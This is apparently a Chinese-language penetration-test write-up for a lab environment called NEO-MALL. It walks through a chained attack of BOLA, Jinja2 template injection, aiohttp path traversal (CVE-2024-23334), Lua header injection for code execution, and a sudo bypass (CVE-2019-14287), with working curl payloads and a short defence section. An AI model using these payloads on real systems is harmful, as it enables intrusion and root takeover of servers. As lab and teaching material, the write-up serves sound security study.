# 專業滲透測試報告：NEO-MALL 企業級環境 (CVE 連鎖漏洞版)

## 1. 執行摘要 (Executive Summary)
本環境展示了一個完整的連鎖漏洞攻擊鏈，從外網掃描到獲取系統最高權限。核心在於串聯多個不同類型的漏洞：從基礎的 **BOLA** 資訊洩漏，到 **SSTI** 權限提升，最終透過 **CVE-2024-23334 (aiohttp Path Traversal)** 獲取關鍵情報，並利用 **Lua RCE** 取得低權限 Shell，最後透過 **CVE-2019-14287 (sudo PrivEsc)** 達成 Root 提權。

## 2. 核心 CVE 說明
1.  **CVE-2024-23334 (aiohttp Path Traversal)**:
    *   **原理**：aiohttp 在配置 `follow_symlinks=True` 時，靜態檔案路由未能正確過濾 `../`，導致任意檔案讀取。
    *   **作用**：讀取 `deploy_note.txt` 獲取 Nginx 網關隱藏的偵錯介面與 RCE 標頭。
2.  **CVE-2019-14287 (sudo Privilege Escalation)**:
    *   **原理**：當 sudoers 配置為 `ALL=(ALL, !root)` 時，透過指定的 UID `-1` 或 `4294967295` 可繞過限制以 root 身份執行指令。
    *   **作用**：從 `neo-user` 提權至 `root` 以執行 flag 生成腳本。

## 3. 完整攻擊鏈 (Final Attack Chain)

### 第一階段：資訊挖掘 (BOLA & SSTI)
*   **BOLA**：存取 `/api/products/0` 獲取隱藏線索，發現 `/system-status/` 介面。
*   **SSTI**：利用產品評論功能的 Jinja2 漏洞 (`{{ config }}`) 獲取賣家 (Seller) 憑據。

### 第二階段：路徑穿越 (CVE-2024-23334)
*   **動作**：利用賣家權限上傳檔案獲取絕對路徑 `/app/static/uploads/`。
*   **情報**：匿名 FTP 下載 `server_migration.bak` 獲取內部 Port 8081 的資訊。
*   **利用**：透過 Port 8081 繞過網關限制，讀取敏感檔案。
    `curl --path-as-is http://localhost:8081/assets-library/../../site-b-dev/configs/deploy_note.txt`
*   **關鍵收穫**：發現 Nginx Gateway 存在偵錯介面與自定義標頭 `X-NEO-DEBUG`。

### 第三階段：遠端代碼執行 (Lua RCE)
*   **發現**：在 `/system-status/` (site-a-status) 原始碼中發現 `X-NEO-DEBUG` 的具體用法。
*   **利用**：透過 Nginx Lua 注入取得 Gateway 容器的控制權。
    `curl -H 'X-NEO-DEBUG: ngx.say(io.popen("id"):read("*a"))' http://localhost:8080/api/debug-system`
*   **狀態**：獲得 `nobody` 使用者權限 (於 `nginx-gateway` 容器內)。

### 第四階段：橫向移動與權限提升 (Pivot & CVE-2019-14287)
*   **戰術**：由於 `neo-mall` 容器的 `/api/seller/diag` 介面允許來自 Docker 內網的未授權訪問，攻擊者利用 Gateway 的 Lua RCE 作為跳板，向 `neo-mall` 發送指令。
*   **利用**：結合 **CVE-2019-14287**，透過 Lua RCE 遠端呼叫 Mall 的診斷 API 執行提權指令 (繞過 root 限制)。
    `curl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c id\\\"}\""):read("*a"))' http://localhost:8080/api/debug-system`
*   **結果**：伺服器回傳 `uid=0(root)`，成功在 `neo-mall` 容器中取得 **root** 權限。

### 第五階段：獲取 Flag
*   **動作**：執行 root 專屬腳本生成對應學號的動態識別碼。
    `/root/flag.sh <學號>`
*   **Flag 位置**：
    *   User Flag: `/home/neo-user/user_flag.txt`
    *   Root Flag: `/root/root_flag.txt`

## 4. 防禦建議
*   **更新組件**：升級 aiohttp 至 3.9.2+，升級 sudo 至 1.8.28+。
*   **最小權限原則**：避免在 sudoers 中使用 `(ALL, !root)` 這種不安全的例外配置。
*   **關閉偵錯介面**：生產環境應嚴禁移除所有 Lua `loadstring` 等動態執行接口。
